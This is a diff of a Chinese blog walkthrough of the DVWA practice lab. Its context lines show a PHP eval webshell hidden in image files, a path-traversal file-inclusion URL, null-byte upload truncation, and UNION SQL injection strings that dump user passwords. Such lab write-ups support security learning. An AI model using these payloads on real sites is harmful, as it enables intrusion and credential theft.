@@ -4,8 +4,6 @@ date: 2020-02-07 15:30:13
 categories: Web
 ---
 
-> 相关文章：[DVWA练习记录(一)](/2020/02/05/DVWA_1/)、[DVWA练习记录(三)](/2020/02/09/DVWA_3/)
-
 # Brute Force（暴力破解）
 
 暴力破解指的是黑客使用穷举法猜解出用户口令，是最为广泛使用的手法之一。在很多情况下，用户会使用不安全的、很容易被猜解的密码，使得这种攻击变得可能。为了提高猜解的成功率，黑客往往还会与社会工程学结合，从不同渠道获取用户的相关信息，如生日、姓名等可能用来作为密码的信息，再基于这些信息构建字典，将其任意组合对密码进行猜解。
@@ -537,29 +535,29 @@ if( isset( $_POST[ 'Upload' ] ) ) {
    这种情况在不抓包修改的情况下，单纯上传包含恶意代码的图片是不会被直接执行的，服务器会认为是一张图片，在访问时直接显示图片内容。
    所以需要借助文件包含漏洞，将其包含至PHP中执行。
    把之前的一句话木马文件的后缀修改为`.png`或`.jpg`后上传，发现成功通过审查上传成功：
-   
+
    ![](https://hujiekang.top/images/uploads/big/f57093ae33303204ab85380b6d027a20.png)
-   
+
    之后使用`Medium`级别的文件包含将其包含进页面：
-   
+
    Payload：`http://127.0.0.1/DVWA/vulnerabilities/fi/?page=....//....//hackable/uploads/evil.png`
-   
+
    然后就可以使用中国蚁剑登录了（由于DVWA自身带有身份验证的原因，需要在连接的时候带上Cookie，否则无法连接）：
-   
+
    ![](https://hujiekang.top/images/uploads/big/ceea56894124a0de01567d611470dbd5.png)
-   
+
 2. Burpsuite直接改后缀名
    这个太简单了，抓包改掉后缀即可。。。放一张图吧
-   
+
    ![](https://hujiekang.top/images/uploads/big/4c8c43fea794771e62457b02f6a8280d.png)
-   
+
 3. Burpsuite改`chr(0)`截断
    先说说截断的原理吧：我们知道PHP的内核大多都是C语言，而C语言里面判断一个字符串是否结尾就是看是否遇见`'\0'`字符，也就是`chr(0)`。所以如果在文件名中间加入一个`chr(0)`，PHP会认为这个字符串到`chr(0)`这就结束了，`chr(0)`后面的字符串就会被截断。
-   
+
    先把`evil.png`文件名改成`evil.php .png`，留一个空格方便抓包时修改；然后上传该文件，抓包，在Hex部分找到空格对应的字符(`' '=chr(20)`)，将其改为`00`后提交，可以看见文件名已经变成了`evil.php`：
-   
+
    ![](https://hujiekang.top/images/uploads/big/3a5808cd22d6d9eecd6b417de6e6a47e.png)
-   
+
    关于`%00`截断：`%00`截断是PHP在5.3.4版本之前的一个漏洞，要求PHP的`magic_quotes_gpc`为关闭状态。在非`enctype=multipart/form-data`的表单中或URL或Cookie中加入字符串`%00`会导致截断问题，其原因是PHP将`%00`进行了`urldecode()`处理，得到了`chr(0)`，于是在代码中同一行`chr(0)`后面的字符和代码均被截断。
    更多参考：
    <http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html>
@@ -611,20 +609,20 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 于是我们就要想办法给我们的恶意文件添加图片文件头。
 
 1. Windows下`cmd`中使用`copy`命令可以直接将两个文件合并（Powershell中无效，原因未知）
-   
+
    ```bash
    # 图片文件后面一定跟的是 /b ，否则产生的文件大小会和PHP文件大小差不多，且无法读取
    copy avatar.png/b+evil.php/a evil.png
    ```
-   
+
    ![](https://hujiekang.top/images/uploads/big/2582c2172031d07dce84256c25d1b2f7.png)
-   
+
 2. 使用[ExifTool](https://exiftool.org/)修改图片文件头
-   
+
    ```bash
    exiftool -DocumentName="<?php @eval($_POST['evil']) ?>" evil.png
    ```
-   
+
    ![](https://hujiekang.top/images/uploads/big/90dba4d9b79d8193f134fcccf23c007e.png)
 
 接下来上传文件，没有问题成功上传：
@@ -651,7 +649,7 @@ mv /www/DVWA/hackable/uploads/evil.png /www/DVWA/hackable/uploads/evil.php
 下面的程序尝试将之前生成的恶意图片经过这个流程输出，可以发现输出的文件里面所有的恶意代码都被除去。
 
 ```php
-<?php 
+<?php
 
 $img = imagecreatefrompng('evil.png');
 imagepng( $img, 'normal.png', 9);
@@ -818,22 +816,22 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 1. 查询所有数据库名称（`information_schema`数据库下的`schemata`数据表中的`schema_name`列）：
    `id=1' union select null,schema_name from information_schema.schemata#`
-   
+
    ![](https://hujiekang.top/images/uploads/big/dc132527a2c3c39f6a0b87c3984e8232.png)
-   
+
 2. 查询当前数据库下的所有数据表名称（`information_schema`数据库下的`tables`数据表中的`table_name`列）：
    `id=1' union select null,table_name from information_schema.tables where table_schema=database()#`
-   
+
    ![](https://hujiekang.top/images/uploads/big/c34329fbbce59345606c63d7689014e4.png)
-   
+
 3. 获取数据表下所有列名称（`information_schema`数据库下的`columns`数据表中的`column_name`列）：
    `id=1' union select null,column_name from information_schema.columns where table_schema=database() and table_name='users'#`
-   
+
    ![](https://hujiekang.top/images/uploads/big/56553a3da67289461cb41d400894fc00.png)
-   
+
 4. 获取数据：
    `id=1' union select user,password from users#`
-   
+
    ![](https://hujiekang.top/images/uploads/big/7582a38e54a78c0a35fa180e0f2ad263.png)
 
 至此，数据已经顺利拿到。
@@ -914,7 +912,7 @@ if( isset( $_SESSION [ 'id' ] ) ) {
         echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
     }
 
-    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
 }
 
 ?>
